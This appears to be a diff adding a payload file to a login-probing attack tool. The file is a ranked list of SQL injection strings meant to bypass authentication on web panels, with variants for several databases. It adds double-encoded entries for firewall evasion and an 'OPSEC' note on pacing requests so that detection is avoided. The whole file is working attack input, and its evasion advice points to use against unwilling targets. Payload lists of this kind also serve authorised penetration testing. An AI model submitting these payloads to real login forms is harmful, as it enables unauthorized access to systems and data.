@@ -1,0 +1,65 @@
+# sqli_bypass_payloads.txt — Module 2-K: Web Panel Login Prober
+#
+# Curated SQLi authentication-bypass payloads.
+# Each non-blank, non-comment line is a distinct payload injected into
+# both the username and password fields independently.
+#
+# Ordering: probability of success descending based on WebCrack, SQLMap
+# auth-bypass templates, and OWASP Testing Guide OTG-AUTHN-004.
+#
+# Format: one payload per line. Leading/trailing whitespace is stripped
+# by the loader. Lines beginning with # are comments.
+#
+# OPSEC note: These payloads generate anomalous SQL error responses that
+# many WAFs detect on signature. Use --delay and --jitter to spread
+# requests. If the target has a WAF, consider --dry-run first to preview
+# the payload list and assess detectability before live submission.
+#
+# ── Classic OR-based bypasses ─────────────────────────────────────────
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR "1"="1
+" OR "1"="1"--
+" OR 1=1--
+" OR 1=1#
+admin'--
+admin' #
+admin'/*
+# ── Tautology variants ────────────────────────────────────────────────
+') OR ('1'='1
+') OR ('1'='1'--
+') OR (1=1)--
+' OR 'x'='x
+' OR 'a'='a
+") OR ("1"="1
+") OR (1=1)--
+# ── Comment-terminated admin payloads ─────────────────────────────────
+admin'--
+admin" --
+admin' ;--
+# ── NULL/blank bypass (some PHP apps) ─────────────────────────────────
+' OR 1=1 LIMIT 1;--
+' OR 1=1 LIMIT 1--
+'OR 1=1--
+'OR'1'='1
+# ── MySQL-specific ────────────────────────────────────────────────────
+' OR 1=1-- -
+' OR '1'='1'-- -
+') OR 1=1-- -
+# ── MSSQL-specific ────────────────────────────────────────────────────
+'; IF (1=1) SELECT 1--
+' OR 1=1; --
+# ── PostgreSQL-specific ───────────────────────────────────────────────
+' OR 1=1--
+') OR (1=1)--
+' OR TRUE--
+# ── Generic universal password attempts (non-SQLi, structural test) ───
+anything' OR 'x'='x
+any') OR ('1'='1
+# ── Double-encoding evasion (WAF bypass) ──────────────────────────────
+%27 OR %271%27%3D%271
+%27 OR 1%3D1--
